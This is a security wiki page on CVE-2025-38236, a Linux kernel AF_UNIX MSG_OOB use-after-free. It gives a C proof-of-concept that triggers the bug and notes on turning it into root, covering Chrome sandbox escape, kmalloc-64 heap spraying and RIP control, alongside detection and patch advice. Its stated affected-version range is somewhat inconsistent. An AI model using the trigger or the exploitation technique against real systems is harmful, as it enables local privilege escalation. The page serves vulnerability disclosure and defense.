# Linux Kernel AF_UNIX MSG_OOB Use-After-Free Privilege Escalation (CVE-2025-38236)

{{#include ../../banners/hacktricks-training.md}}

## Summary
A logic error introduced in Linux kernel 6.9 (commit `5e8078f…`, “spurious-EOF fix”) left a dangling pointer in the `AF_UNIX` out-of-band (OOB) message handling path. When an attacker alternates normal `recv()` calls with `recv(..., MSG_OOB)` on a UNIX socket pair they can trigger a *use-after-free* on a previously freed `struct sk_buff`.  The flaw (CVE-2025-38236) lets an unprivileged local process—​even inside restrictive sandboxes such as Chrome’s renderer—to corrupt kernel memory and obtain root privileges.

The bug was fixed in commit `32ca245464e1` (2025-07-31).  All kernels **≥ 6.9 and < 6.9.3** as well as mainline between 2024-07-16 and the fixing commit are affected.

## Background: AF_UNIX OOB (MSG_OOB)
1. Since Linux 5.15 `AF_UNIX` supports a single 1-byte out-of-band message per stream.
2. The byte is queued in `u->oob_skb`; normal data is queued in `sk_receive_queue`.
3. `recv(..., MSG_OOB)` is handled by `unix_stream_recv_urg()` which:
   • copies the byte to userspace
   • advances a *consumed* counter stored in `skb->cb[48]`
   • clears `u->oob_skb` when the SKB is empty
4. `manage_oob()` runs for every normal `recv()` to keep `oob_skb` in sync.

`unix_skb_len(skb)` returns `skb->len – consumed`, letting the kernel treat partially-read SKBs as empty.

## Root Cause
The 2024 “spurious EOF” refactor changed `manage_oob()` so that it **dropped zero-length SKBs before checking whether the SKB was also `u->oob_skb`**:
```c
/* buggy pseudo-diff */
if (!unix_skb_len(skb)) {
    __skb_unlink(skb, &sk->sk_receive_queue);
    skb = skb_peek(&sk->sk_receive_queue);
}
if (skb == READ_ONCE(u->oob_skb))
    u->oob_skb = NULL;          /* never executed for 0-len path */
```
Consequently, when the first branch removed the SKB, `u->oob_skb` kept pointing to freed memory.  A later `recv(..., MSG_OOB)` passed the dangling pointer to `unix_stream_recv_urg()`, creating a powerful UAF primitive in soft-IRQ context.

## Proof-of-Concept
```c
char dummy;
int s[2];
socketpair(AF_UNIX, SOCK_STREAM, 0, s);

/* 1-byte OOB, read it, repeat ×2 – u->oob_skb now freed */
send(s[1], "A", 1, MSG_OOB);
recv(s[0], &dummy, 1, MSG_OOB);

send(s[1], "A", 1, MSG_OOB);
recv(s[0], &dummy, 1, MSG_OOB);

/* third OOB, then normal recv() – triggers zero-len path */
send(s[1], "A", 1, MSG_OOB);
recv(s[0], &dummy, 1, 0);

/* MSG_OOB uses dangling sk_buff → UAF */
recv(s[0], &dummy, 1, MSG_OOB);
```
A full LPE exploit that leverages heap re-allocation timings is available in Project Zero attachment *67577205*.

## Exploitation Notes
• **Renderer-to-kernel in Chrome**: Chrome’s Linux sandbox whitelists the `send()/recv()` syscalls without filtering the `MSG_OOB` flag, providing a viable attack surface from JavaScript → JIT → native shell-code.

• **Heap shaping**: Because `struct sk_buff` objects are freed via `kfree_rcu()`, attackers get a reliable reclaim window before dereference.  Horn’s exploit sprays `kmalloc-64` caches with `timerfd_ctx` objects to control the freed memory.

• **Privesc primitives**: Overwriting the `timerfd_ctx::tint` pointer to a user-mapped address and waking the timer wins RIP control, converting the UAF into code execution.

## Detection & Mitigation
1. **Kernel version**: If `uname -r` ≥ 6.9 and build date < 2025-08-01 you are likely vulnerable.
2. **Exploit noise**: Repeated
   `kernel: BUG: KASAN: use-after-free in unix_stream_recv_urg`
   entries may appear in dmesg when KASAN is enabled.
3. **Temporary hardening**:
   • Block `MSG_OOB` with seccomp or LSMs.
   • Disable `AF_UNIX` in container namespaces if possible.
4. **Patch**: Apply commit `32ca245464e1` or any stable tree containing `CVE-2025-38236` back-port.

## References
- [Project Zero – From Chrome renderer code exec to kernel with MSG_OOB](https://googleprojectzero.blogspot.com/2025/08/from-chrome-renderer-code-exec-to-kernel.html)
- [Fix commit 32ca245464e1](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=32ca245464e1479bfea8592b9db227fdc1641705)
- [Project Zero tracker entry 423023990 attachment 67577205](https://project-zero.issues.chromium.org/issues/423023990#attachment67577205)

{{#include ../../banners/hacktricks-training.md}}
